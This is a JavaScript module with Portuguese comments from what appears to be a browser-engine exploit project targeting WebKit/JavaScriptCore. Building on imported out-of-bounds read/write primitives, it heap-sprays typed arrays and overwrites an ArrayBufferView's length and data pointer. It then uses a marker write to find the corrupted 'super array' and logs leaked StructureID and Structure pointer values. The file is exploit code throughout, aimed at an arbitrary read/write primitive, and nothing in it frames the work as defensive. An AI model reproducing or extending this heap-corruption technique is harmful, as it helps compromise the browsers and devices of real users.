// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO
// ============================================================
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_WRITE_OFFSET_0x6C = 0x6C; // Afetado pela escrita em 0x70

// ============================================================
// FUNÇÃO DE INVESTIGAÇÃO
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v9_FillPattern"; // Versão atualizada
    logS3(`--- Iniciando Investigação (${FNAME_SPRAY_INVESTIGATE}): Identificar e Usar Array Corrompido ---`, "test", FNAME_SPRAY_INVESTIGATE);

    const NUM_SPRAY_OBJECTS = 10000;
    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8;
    const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x58;

    const PLANT_MVECTOR_LOW_PART  = 0x00000000;
    const PLANT_MVECTOR_HIGH_PART = 0x00000000;

    let sprayedVictimObjects = [];
    let superArray = null;

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
            throw new Error("OOB Init ou primitivas R/W falharam.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);

        // NOVA ADIÇÃO: Preencher o oob_array_buffer_real com um padrão
        const FILL_PATTERN = 0xCAFEBABE; // Padrão reconhecível
        logS3(`Preenchendo oob_array_buffer_real (${oob_array_buffer_real.byteLength} bytes) com padrão ${toHex(FILL_PATTERN)}...`, "info", FNAME_SPRAY_INVESTIGATE);
        for (let i = 0; i < oob_array_buffer_real.byteLength; i += 4) {
            try {
                // Garantir que OOB_CONFIG.ALLOCATION_SIZE seja múltiplo de 4
                if (i + 4 <= oob_array_buffer_real.byteLength) {
                    oob_write_absolute(i, FILL_PATTERN, 4);
                }
            } catch (e) {
                logS3(`Erro ao preencher oob_array_buffer_real no offset ${toHex(i)}: ${e.message}`, "error", FNAME_SPRAY_INVESTIGATE);
                break;
            }
        }
        logS3("Preenchimento do oob_array_buffer_real concluído.", "info", FNAME_SPRAY_INVESTIGATE);
        // FIM DA NOVA ADIÇÃO

        // 1. Heap Spraying
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT);
            arr[0] = (0xFACE0000 | i);
            sprayedVictimObjects.push(arr);
        }
        logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
        await PAUSE_S3(200);

        // 2. Preparar oob_array_buffer_real, Plantar valores para m_vector
        // NÃO vamos mais limpar m_vector explicitamente aqui com oob_write_absolute para ver o efeito do padrão.
        // A escrita do FILL_PATTERN já deve ter preenchido.
        // O plantio de PLANT_MVECTOR_LOW_PART e PLANT_MVECTOR_HIGH_PART (que são 0x0) irá sobrescrever o padrão nesses locais específicos.
        const m_vector_low_addr = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
        const m_vector_high_addr = m_vector_low_addr + 4; // 0x6C

        // Plantar os valores 0 para m_vector (sobrescrevendo o FILL_PATTERN nesses locais)
        oob_write_absolute(m_vector_low_addr, PLANT_MVECTOR_LOW_PART, 4);
        oob_write_absolute(m_vector_high_addr, PLANT_MVECTOR_HIGH_PART, 4);
        // Zerar a parte alta de 0x6C (início de 0x70)
        oob_write_absolute(TARGET_WRITE_OFFSET_0x6C + 4, 0x0, 4);


        logS3(`Valores plantados ANTES da corrupção trigger:`, "info", FNAME_SPRAY_INVESTIGATE);
        logS3(`  QWORD @${toHex(m_vector_low_addr)} (m_vector): ${oob_read_absolute(m_vector_low_addr, 8).toString(true)} (Esperado: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "info", FNAME_SPRAY_INVESTIGATE);
        
        // 3. Acionar a Corrupção Principal
        logS3(`Realizando escrita OOB em ${toHex(CORRUPTION_OFFSET_TRIGGER)} (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_INVESTIGATE);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        
        // 4. Fase de Pós-Corrupção: Ler metadados e tentar identificar/usar o array
        logS3(`FASE 4: Investigando o offset ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} APÓS corrupção...`, "info", FNAME_SPRAY_INVESTIGATE);
        
        const victimBaseOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET;
        const sidOffsetWithinVictim = JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
        const flagsOffsetWithinVictim = JSC_OFFSETS.ArrayBufferView.FLAGS_OFFSET;

        try {
            let potential_sid = oob_read_absolute(victimBaseOffset + sidOffsetWithinVictim, 4);
            logS3(`LEITURA: Valor no offset do StructureID (0x58 + ${toHex(sidOffsetWithinVictim,16)}): ${toHex(potential_sid)}`, 'leak', FNAME_SPRAY_INVESTIGATE);

            let potential_flags = oob_read_absolute(victimBaseOffset + flagsOffsetWithinVictim, 4);
            logS3(`LEITURA: Valor no offset das Flags (0x58 + ${toHex(flagsOffsetWithinVictim,16)}): ${toHex(potential_flags)}`, 'leak', FNAME_SPRAY_INVESTIGATE);

            let potential_struct_ptr = oob_read_absolute(victimBaseOffset + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, 8);
            logS3(`LEITURA: Valor no offset do Structure* (0x58 + ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET,16)}): ${potential_struct_ptr.toString(true)}`, 'leak', FNAME_SPRAY_INVESTIGATE);

        } catch (e) {
            logS3(`LEITURA: Erro ao tentar ler StructureID/Flags: ${e.message}`, 'error', FNAME_SPRAY_INVESTIGATE);
        }

        let abv_vector_after, abv_length_after;
        const vec_offset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const len_offset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        try { abv_vector_after = oob_read_absolute(vec_offset, 8); } catch(e) {} 
        try { abv_length_after = oob_read_absolute(len_offset, 4); } catch(e) {} 
            
        logS3(`    m_vector (@${toHex(vec_offset)}): ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : "Erro Leitura"}`, "leak", FNAME_SPRAY_INVESTIGATE);
        logS3(`    m_length (@${toHex(len_offset)}): ${toHex(abv_length_after)} (Decimal: ${abv_length_after})`, "leak", FNAME_SPRAY_INVESTIGATE);

        if (typeof abv_length_after === 'number' && abv_length_after === 0xFFFFFFFF &&
            isAdvancedInt64Object(abv_vector_after) && abv_vector_after.low() === PLANT_MVECTOR_LOW_PART && abv_vector_after.high() === PLANT_MVECTOR_HIGH_PART) {
            logS3(`    !!!! SUCESSO NA CORRUPÇÃO DE METADADOS EM ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} !!!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
            logS3(`      m_length CORROMPIDO para 0xFFFFFFFF!`, "vuln", FNAME_SPRAY_INVESTIGATE);
            logS3(`      m_vector CONTROLADO para ${abv_vector_after.toString(true)}!`, "vuln", FNAME_SPRAY_INVESTIGATE);
            document.title = `Spray: m_vec=${abv_vector_after.toString(true)}, m_len=FFFFFFFF`;

            if (abv_vector_after.low() === 0 && abv_vector_after.high() === 0) {
                logS3("    m_vector é ZERO. Tentando identificar qual objeto JS foi corrompido...", "warn", FNAME_SPRAY_INVESTIGATE);
                
                const MARKER_VALUE_TO_WRITE = 0xDEADBEEF;
                const MARKER_TEST_OFFSET_IN_OOB_BUFFER = 0x10; 
                const MARKER_TEST_INDEX_IN_U32_ARRAY = MARKER_TEST_OFFSET_IN_OOB_BUFFER / 4; 
                
                let original_value_at_marker_offset = 0;
                try { original_value_at_marker_offset = oob_read_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, 4); } catch(e){}

                oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, MARKER_VALUE_TO_WRITE, 4);
                logS3(`    Marcador ${toHex(MARKER_VALUE_TO_WRITE)} escrito em oob_buffer[${toHex(MARKER_TEST_OFFSET_IN_OOB_BUFFER)}] via oob_write.`, "info", FNAME_SPRAY_INVESTIGATE);

                for (let i = 0; i < sprayedVictimObjects.length; i++) {
                    try {
                        if (sprayedVictimObjects[i][MARKER_TEST_INDEX_IN_U32_ARRAY] === MARKER_VALUE_TO_WRITE) {
                            logS3(`      !!!! SUPER ARRAY ENCONTRADO !!!! sprayedVictimObjects[${i}] (marcador inicial: ${toHex(sprayedVictimObjects[i][0])})`, "vuln", FNAME_SPRAY_INVESTIGATE);
                            logS3(`        Confirmado lendo o marcador ${toHex(MARKER_VALUE_TO_WRITE)} no índice ${MARKER_TEST_INDEX_IN_U32_ARRAY}.`, "vuln", FNAME_SPRAY_INVESTIGATE);
                            superArray = sprayedVictimObjects[i];
                            document.title = `SUPER ARRAY[${i}] VIVO!`;

                            const sid_offset_in_oob = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
                            const sid_index = sid_offset_in_oob / 4; 
                            if (sid_offset_in_oob % 4 === 0 && sid_index < 0xFFFFFFFF) {
                                const actual_sid_at_victim_loc = superArray[sid_index];
                                logS3(`        LIDO COM SUPER_ARRAY: StructureID no offset ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)} é ${toHex(actual_sid_at_victim_loc)}`, "leak", FNAME_SPRAY_INVESTIGATE);
                                if (actual_sid_at_victim_loc !==0 ) { 
                                     logS3(`          ESTE É O STRUCTUREID REAL DO OBJETO EM ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)}! Compare com o esperado.`, "good", FNAME_SPRAY_INVESTIGATE);
                                }
                            }
                            break; 
                        }
                    } catch (e_access) { /* Ignora erros de acesso */ }
                }
                try {oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, original_value_at_marker_offset, 4); } catch(e){}

                if (superArray) {
                    logS3("    Primitiva de Leitura/Escrita Arbitrária (limitada ao oob_buffer) provavelmente alcançada via 'superArray'!", "vuln", FNAME_SPRAY_INVESTIGATE);
                } else {
                    logS3("    Não foi possível identificar o 'superArray' específico entre os objetos pulverizados nesta tentativa.", "warn", FNAME_SPRAY_INVESTIGATE);
                }
            } else {
                logS3("    m_vector não é 0. A identificação e uso do array corrompido são mais complexos.", "warn", FNAME_SPRAY_INVESTIGATE);
            }
        } else {
            logS3(`    Falha em corromper m_length ou controlar m_vector como esperado no offset ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)}.`, "error", FNAME_SPRAY_INVESTIGATE);
        }
        logS3("INVESTIGAÇÃO DETALHADA COM SPRAY CONCLUÍDA.", "test", FNAME_SPRAY_INVESTIGATE);

    } catch (e) {
        logS3(`ERRO CRÍTICO na investigação com spray: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
        document.title = "Spray & Investigate FALHOU!";
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- Investigação com Spray (${FNAME_SPRAY_INVESTIGATE}) Concluída ---`, "test", FNAME_SPRAY_INVESTIGATE);
    }
}
